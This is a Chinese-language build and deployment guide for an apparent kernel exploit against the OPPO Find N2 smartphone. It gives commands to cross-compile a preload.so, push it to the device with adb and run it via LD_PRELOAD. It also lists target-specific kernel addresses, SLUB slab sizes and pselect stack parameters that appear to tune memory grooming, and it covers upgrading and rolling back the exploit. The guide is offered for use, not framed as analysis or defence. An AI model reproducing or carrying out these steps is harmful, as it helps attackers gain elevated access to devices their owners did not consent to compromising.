# 环境搭建与部署文档

## 依赖清单

### 软件依赖

| 组件 | 版本 | 用途 | 安装方式 |
|------|------|------|---------|
| Android NDK | r29 | 交叉编译 exploit | `brew install --cask android-ndk` |
| ADB | 37.0+ | Android 设备调试 | `brew install android-platform-tools` |
| Python | 3.8+ | 服务器脚本 | 系统自带或 `brew install python3` |
| Git | 2.0+ | 版本控制 | `brew install git` |
| IDA Pro | 7.0+ | 二进制分析 (可选) | 商业软件 |

### 硬件依赖

| 组件 | 要求 |
|------|------|
| 目标设备 | OPPO Find N2 (PGU110/CPH2413) |
| USB 连接 | ADB 调试模式 |
| 存储空间 | ~500MB (NDK + 工具链) |

## 本地开发环境搭建

### 步骤 1: 安装 Android NDK

```bash
# macOS
brew install --cask android-ndk

# 验证安装
ls /tmp/ndk_extract/android-ndk-r29/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang

# 如果安装在其他路径，设置环境变量
export NDK_PATH=/path/to/android-ndk-r29
```

### 步骤 2: 安装 ADB

```bash
# macOS
brew install android-platform-tools

# 验证安装
adb version
adb devices  # 确认设备已连接
```

### 步骤 3: 克隆仓库

```bash
git clone https://github.com/pubglite55/oppo-ghostlock.git
cd oppo-ghostlock
```

### 步骤 4: 编译 exploit

```bash
cd exploit/

# 自动检测 NDK
make

# 或指定 NDK 路径
make NDK=/tmp/ndk_extract/android-ndk-r29
```

**预期输出**:
```
Build complete: preload.so
-rwxr-xr-x  1 user  staff  129K  preload.so
```

### 步骤 5: 部署到设备

```bash
adb push preload.so /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/preload.so"
```

### 步骤 6: 验证

```bash
adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id"
```

**预期输出**:
```
[+] preload starting pid=...
[+] startup context pid=... uid=2000 euid=2000
```

## 配置项全解

### target.h 关键配置

```c
// 设备标识
#define BUILD_VARIANT_LABEL "oppo_find_n2_sm8475"
#define BUILD_FINGERPRINT "OPPO/CPH2413/CPH2413:16/..."

// 内核地址
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL  // 39-bit VA
#define P0_PAGE_OFFSET 0xffffffc000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL

// SLUB 参数
#define MM_STRUCT_SZ 0x3c0  // 960 bytes
#define MM_ORDER 3           // 32KB slabs
#define futex_hashsize 2048  // 8 CPUs * 256

// Stack 参数
#define PSELECT_ROUTE_NFDS 320  // pselect NFDS (必须 < 336)
```

### Makefile 配置

```makefile
# NDK 路径 (自动检测或手动指定)
NDK ?= /tmp/ndk_extract/android-ndk-r29

# 编译目标
TARGET = preload.so

# 编译选项
CFLAGS = --target=aarch64-linux-android35 \
         --sysroot=$(SYSROOT) \
         -O2 -fPIC -shared
```

## 升级与回滚

### 升级步骤

```bash
# 1. 拉取最新代码
git pull origin main

# 2. 重新编译
cd exploit && make clean && make

# 3. 重新部署
adb push preload.so /data/local/tmp/
```

### 回滚方案

```bash
# 回滚到特定版本
git checkout <commit-hash>
cd exploit && make clean && make
adb push preload.so /data/local/tmp/
```
